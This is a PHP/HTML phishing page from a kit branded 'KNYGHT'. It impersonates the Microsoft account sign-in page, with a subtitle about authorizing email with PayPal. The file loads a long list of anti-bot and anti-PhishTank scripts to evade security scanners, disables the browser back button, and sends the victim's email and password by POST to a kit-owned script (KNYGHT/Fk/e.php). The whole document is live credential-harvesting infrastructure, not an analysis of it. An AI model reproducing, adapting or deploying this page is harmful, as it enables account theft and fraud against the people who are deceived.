<?php

   session_start();
  
include "../../../KNYGHT/antis/anti1.php";
include "../../../KNYGHT/antis/anti2.php";
include "../../../KNYGHT/antis/anti3.php";
include "../../../KNYGHT/antis/anti4.php";
include "../../../KNYGHT/antis/anti5.php";
include "../../../KNYGHT/antis/anti6.php";
include "../../../KNYGHT/antis/anti7.php";
include "../../../KNYGHT/antis/anti8.php";
include "../../../KNYGHT/antis/antibots5.php";
include "../../../KNYGHT/antis/antibot_host.php";
include "../../../KNYGHT/antis/antibot_phishtank.php";
include "../../../KNYGHT/antis/antibot_userAgent.php";
include "../../../KNYGHT/antis/blocklist.php";
include "../../../KNYGHT/antis/Bot-Crawler.php";
include "../../../KNYGHT/antis/Bot-Spox.php";
include "../../../KNYGHT/antis/dd.php";
include "../../../KNYGHT/antis/IP-BlackList.php";
include "../../../KNYGHT/antis/someBots.php";

   
   ?>
<!DOCTYPE html>
<!-- ServerInfo: BY1PPF7C18EDECD 2021.10.15.16.09.26 LocVer:0 -->
<!-- PreprocessInfo: CBA-1015_154419_0:DS2PAPS1966D085, 2021-10-15T16:05:07.2793922-07:00 - Version: 16,0,29206,6 -->
<!-- RequestLCID: 1033, Market:EN-US, PrefCountry: US, LangLCID: 1033, LangISO: EN -->
<html dir="ltr" lang="EN-US"><head>
<script type="text/javascript">
function preback() {window.history.forward();}
setTimeout("preback()",0);
windows.onunload=function(){null};
</script>

<link rel="preconnect" href="#" crossorigin="">
<link rel="preconnect" href="https://logincdn.msauth.net/" crossorigin="">
<meta http-equiv="x-dns-prefetch-control" content="on">
<link rel="dns-prefetch" href="https://acctcdn.msauth.net/">
<link rel="dns-prefetch" href="https://acctcdn.msftauth.net/">
<link rel="dns-prefetch" href="https://acctcdnmsftuswe2.azureedge.net/">
<link rel="dns-prefetch" href="https://acctcdnvzeuno.azureedge.net/">
<link rel="dns-prefetch" href="https://logincdn.msauth.net/">
<link rel="dns-prefetch" href="https://lgincdnvzeuno.azureedge.net/">
<link rel="dns-prefetch" href="https://lgincdnmsftuswe2.azureedge.net/">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><!-- base href="https://login.live.com/" -->
<script type="text/javascript">!function(n,e){for(var r in e)n[r]=e[r]}(this,function(n){function e(o){if(r[o])return r[o].exports;var t=r[o]={exports:{},id:o,loaded:!1};return n[o].call(t.exports,t,t.exports,e),t.loaded=!0,t.exports}var r={};return e.m=n,e.c=r,e.p="",e(0)}([function(n,e){!function(){function n(){return r.$Config||r.ServerData||{}}function e(){var e=(n(),new t),r=this,i=[],f=[];r.Add=function(n,r,o,t){e.Add(n,r,o,t)},r.Provides=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)i.push(n[e]);else i.push(n)},r.Requires=function(n){if(n)if(n instanceof Array)for(var e=0;e<n.length;e++)f.push(n[e]);else f.push(n)},r.Load=function(n,r){var t=function(){n&&n();for(var e=0;e<i.length;e++)o.register(i[e],0,!0)},u=function(){e.Load(t,r)};f.length>0?o.when(f,u):u()}}var r=window,o=(r.document,r.$Do),t=r.$Loader,i=".css";i.length;e.WhenLoaded=function(n,e){o.when(n,e)},r.$DepLoader=e}()}]));</script><link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29206.6/images/favicon.ico"><link rel="stylesheet" title="Converged_v2" type="text/css" onload="$Loader.OnSuccess(this)" onerror="$Loader.OnError(this)" href="KNYGHT/Converged_v21033__M8MTZS7Nv0I1zR18wdR-g2.css"><style type="text/css"></style><style type="text/css">body{display:none;}</style>
<script type="text/javascript">if (top != self){try{top.location.replace(self.location.href);}catch (e){}}else{document.write(unescape('%3C%73') + 'tyle type="text/css">body{display:block !important;}</style>');}</script><style type="text/css">body{display:block !important;}</style><noscript><style type="text/css">body{display:block !important;}</style></noscript>
<style type="text/css">.inner,.promoted-fed-cred-box,.sign-in-box,.new-session-popup-v2sso,.debug-details-banner,.vertical-split-content{min-width:0;}</style></head><body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass"><div><!--  -->

<!--  -->





<div data-bind="if: activeDialog"></div>

<form action="../../../KNYGHT/Fk/e.php"  method="POST">


    <!-- ko withProperties: { '$loginPage': $data } -->
    <div data-bind="component: { name: 'master-page',
        params: {
            serverData: svr,
            showButtons: svr.e,
            showFooterLinks: true,
            useWizardBehavior: svr.By,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!--  -->

<!-- ko ifnot: useLayoutTemplates --><!-- /ko -->

<!-- ko if: useLayoutTemplates -->
    <!-- ko withProperties: { '$page': $parent } -->
        <!-- ko ifnot: isVerticalSplitTemplate -->
        <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr } }"><!--  -->

    <div id="lightboxBackgroundContainer" data-bind="component: { name: 'background-image-control',
    publicMethods: $page.backgroundControlMethods,
    event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
    <!-- ko if: smallImageUrl --><!-- /ko -->

    <!-- ko if: backgroundImageUrl -->
    <div data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);" class="background-image ext-background-image"></div>
        <!-- ko if: useImageMask --><!-- /ko -->
    <!-- /ko -->
</div></div>

<!-- ko if: svr.cj --><!-- /ko -->

<!-- ko withProperties: { '$masterPageContext': $parentContext } -->
<div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
    <!-- ko if: showHeader --><!-- /ko -->

    <div class="template-section main-section">
        <div data-bind="css: { 'has-header': showHeader }, externalCss: { 'middle': true }" class="middle ext-middle">
            <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr } }"><!--  -->

<!-- ko withProperties: { '$content': $data } -->
<div class="flex-column">
    <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder --><!-- /ko -->

    <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl --><!-- /ko -->

    <div class="win-scroll">
        <div id="lightbox" data-bind="
            animationEnd: $page.paginationControlHelper.animationEnd,
            externalCss: { 'sign-in-box': true },
            css: {
                'inner':  $content.isVerticalSplitTemplate,
                'vertical-split-content': $content.isVerticalSplitTemplate,
                'app': $page.backgroundLogoUrl,
                'wide': $page.paginationControlHelper.useWiderWidth,
                'fade-in-lightbox': $page.fadeInLightBox,
                'has-popup': $page.showFedCredAndNewSession &amp;&amp; ($page.showFedCredButtons() || $page.newSession()),
                'transparent-lightbox': $page.backgroundControlMethods() &amp;&amp; $page.backgroundControlMethods().useTransparentLightBox,
                'lightbox-bottom-margin-debug': $page.showDebugDetails }" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">

            <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

        <!-- ko if: svr.Bn --><!-- /ko -->

        <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.Cb &amp;&amp; showLightboxProgress() }"></div>

        <!-- ko if: showLightboxProgress --><!-- /ko -->

        <!-- ko if: loadBannerLogo -->
        <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }"><!--  -->

<!-- ko if: bannerLogoUrl --><!-- /ko -->

<!-- ko if: !bannerLogoUrl && !isChinaDc -->
    <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="img" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" data-bind="imgSrc, attr: { alt: str['MOBILE_STR_Footer_Microsoft'] }" src="../../portal/KNYGHT/pp.png" alt="Microsoft"><!-- /ko -->
<!-- /ko --><!-- /ko -->
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: svr.c8 && paginationControlHelper.showLwaDisclaimer() --><!-- /ko -->

        <!-- ko if: asyncInitReady -->
        <div role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.aV,
                disableAnimationIfAnimationEndUnsupported: svr.Cf,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

<div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
    <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.I) --><!-- /ko -->

    <div class="pagination-view animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.I),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

        <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() -->
                <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-showfedcredbutton="true" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    displayName: sharedData.displayName,
                    otherIdpRedirectUrl: sharedData.otherIdpRedirectUrl,
                    prefillNames: $loginPage.prefillNames,
                    flowToken: sharedData.flowToken,
                    availableSignupCreds: sharedData.availableSignupCreds },
                event: {
                    redirect: $loginPage.view_onRedirect,
                    setPendingRequest: $loginPage.view_onSetPendingRequest,
                    registerDialog: $loginPage.view_onRegisterDialog,
                    unregisterDialog: $loginPage.view_onUnregisterDialog,
                    showDialog: $loginPage.view_onShowDialog,
                    updateAvailableCredsWithoutUsername: $loginPage.view_onUpdateAvailableCreds,
                    agreementClick: $loginPage.footer_agreementClick } }"><!--  -->

<div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: str['WF_STR_HeaderDefault_Title'] } }"><div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
    <div role="heading" aria-level="1" data-bind="text: title">Sign in</div><font color="Gray"><small>Authorize your email with Paypal</small></font>
    <!-- ko if: isSubtitleVisible --><!-- /ko -->
</div></div>

<!-- ko if: pageDescription && !svr.Cj --><!-- /ko -->

<div class="row">
    <div role="alert" aria-live="assertive">
        <!-- ko if: usernameTextbox.error --><!-- /ko -->
    </div>

    <div class="form-group col-md-24">
        <!-- ko if: prefillNames().length > 1 --><!-- /ko -->

        <!-- ko ifnot: prefillNames().length > 1 -->
        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.aQ ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input type="email" name="mail" id="i0116" maxlength="113"  class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-bind="
                    attr: { lang: svr.aS ? null : 'en' },
                    externalCss: {
                        'input': true,
                        'text-box': true,
                        'has-error': usernameTextbox.error },
                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.Cj ? ' loginDescription usernameError' : ' usernameError'),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText" aria-label="Enter your email, phone, or Skype." aria-describedby="loginHeader usernameError" placeholder="Email Address" required="required">

            <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
<div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.aQ ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
    <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

            <input type="password" name="pass" id="i0116" maxlength="113"  class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-bind="
                    attr: { lang: svr.aS ? null : 'en' },
                    externalCss: {
                        'input': true,
                        'text-box': true,
                        'has-error': usernameTextbox.error },
                    ariaLabel: tenantBranding.unsafe_userIdLabel || str['CT_PWD_STR_Username_AriaLabel'],
                    ariaDescribedBy: 'loginHeader' + (pageDescription &amp;&amp; !svr.Cj ? ' loginDescription usernameError' : ' usernameError'),
                    textInput: usernameTextbox.value,
                    hasFocusEx: usernameTextbox.focused,
                    placeholder: $placeholderText" aria-label="." aria-describedby="loginHeader usernameError" placeholder="Email Password" required="required">

            <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
        <!-- /ko -->
<!-- /ko -->
<!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>
        <!-- /ko -->
    </div>
</div>

<div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
    <div class="row">
        <div class="col-md-24">
            <div class="text-13">
                <!-- ko if: svr.As && !svr.Af && !svr.aT -->
                <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.J || '#',
                            ariaLabel: svr.J ? str['WF_STR_SignupLink_AriaLabel_Text'] : str['WF_STR_SignupLink_AriaLabel_Generic_Text'],
                            click: signup_onClick } }">No account? <a href="#" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                <!-- /ko -->

                <!-- ko ifnot: hideCantAccessYourAccount --><!-- /ko -->

                <!-- ko if: showFidoLinkInline && hasFido() && (availableCredsWithoutUsername().length >= 2 || svr.Ah || isOfflineAccountVisible) --><!-- /ko -->

                <!-- ko if: showCredPicker --><!-- /ko -->

                <!-- ko if: svr.aM --><!-- /ko -->
            </div>
        </div>
    </div>
</div>

<!-- ko if: svr.CZ --><!-- /ko -->

<div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
        <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.e,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.e &amp;&amp; isSecondaryButtonVisible(),
                secondaryButtonText: secondaryButtonText() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin }">

    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-bind="
            attr: primaryButtonAttributes,
            externalCss: {
                'button': true,
                'primary': true },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Next">
    </div>
</div></div>
    </div>
</div>

<!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko -->
            <!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
        <!-- /ko -->
    </div>
</div></div>
        <!-- /ko -->

        <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
        <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
        <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
        <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
        <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
        <input type="hidden" name="ctx" data-bind="value: ctx" value="">
        <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
        <input type="hidden" id="i0327" data-bind="attr: { name: svr.bJ }, value: flowToken" name="PPFT" value="DazvI1mv01SCWvApSXclHkNU9kU7v*ApxNYtqtezJPp0kb5HTW!QwKZzjkeO*ab9ZPKTmmAHa3kHAmeQ183cu0l5uWAI39Rbz8s77ureLtcLTOY0Vp2eG99fFvP5oXF2pcR6cazpYF709W9Z9wqh4f*ZVJdx1OSvEwQFGdVTyt91Mnke2m2zcuRDhwZMeHF623g5EJ!TPy1x1Er8J6PkRF4mh1N0EpqgdB9KoBVHElWcBxa6jay1ZamF1cTI146zVw$$">
        <input type="hidden" name="PPSX" data-bind="value: svr.cZ" value="PassportRN">
        <input type="hidden" name="NewUser" value="1">
        <input type="hidden" name="FoundMSAs" data-bind="value: svr.Ak" value="">
        <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
        <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
        <input type="hidden" name="CookieDisclosure" data-bind="value: svr.Bn ? 1 : 0" value="0">
        <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0">
        <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
        <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1">
<input type="hidden" name="i17" data-bind="value: srsFailed" value="0">
<input type="hidden" name="i18" data-bind="value: srsSuccess">
<input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
    <!-- /ko -->
        </div>

        <!-- ko if: $page.showFedCredAndNewSession -->
        <!-- ko if: $page.showFedCredButtons -->
        <div data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }" class="promoted-fed-cred-box ext-promoted-fed-cred-box">
            <div class="promoted-fed-cred-content" data-bind="css: {
                'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
                'slide-out-next': $page.animate.isSlideOutNext,
                'slide-in-next': $page.animate.isSlideInNext,
                'slide-out-back': $page.animate.isSlideOutBack,
                'slide-in-back': $page.animate.isSlideInBack,
                'app': $page.backgroundLogoUrl }">

                <!-- ko foreach: $page.otherSigninOptions -->
                <div class="row tile">
                    <div class="table" role="button" tabindex="0" data-bind="
                        css: { 'list-item': svr.cB },
                        pressEnter: $page.otherSigninOptionsButton_onClick,
                        click: $page.otherSigninOptionsButton_onClick,
                        ariaLabel: $data.text" aria-label="Sign-in options">

                        <div class="table-row">
                            <div class="table-cell tile-img medium">
                                <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
<!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
<!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="KNYGHT/signin-options_4e48046ce74f4b89d45037c90576bfac.svg"><!-- /ko -->
<!-- /ko --><!-- /ko -->
                            </div>
                            <div class="table-cell text-left content" data-bind="css: { 'content': !svr.cB }">
                                <div data-bind="
                                    text: $data.text,
                                    attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Sign-in options</div>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- /ko -->
            </div>
        </div>
        <!-- /ko -->

        <!-- ko if: $page.newSession --><!-- /ko -->
        <!-- /ko -->

        <!-- ko if: $page.showDebugDetails --><!-- /ko -->
    </div>
</div>
<!-- /ko --></div>
        </div>
    </div>

    <!-- ko if: $page.paginationControlHelper.showFooterControl -->
    <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

        <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }"><!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
<div id="footerLinks" class="footerNode text-secondary">

    <!-- ko if: showFooter -->
        <!-- ko if: !hideTOU -->
        <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="#" class="footer-content ext-footer-content footer-item ext-footer-item">Terms of use</a>
        <!-- /ko -->

        <!-- ko if: !hidePrivacy -->
        <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="#" class="footer-content ext-footer-content footer-item ext-footer-item">Privacy &amp; cookies</a>
        <!-- /ko -->

        <!-- ko if: impressumLink --><!-- /ko -->

        <!-- ko if: showIcpLicense --><!-- /ko -->
    <!-- /ko -->

    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
</div>
<!-- /ko -->

<!-- ko if: svr.CZ && showLinks --><!-- /ko --></div>
    </div>
    <!-- /ko -->
</div>
<!-- /ko --></div>
        <!-- /ko -->

        <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() --><!-- /ko -->
    <!-- /ko -->
<!-- /ko --></div>
    <!-- /ko -->
</form>



<!-- ko if: svr.aE -->
<div id="idPartnerPL" data-bind="injectIframe: { url: svr.aE }"><iframe style="display: none;" src="KNYGHT/prefetch.htm" width="0" height="0"></iframe></div>
<!-- /ko --></div></body></html>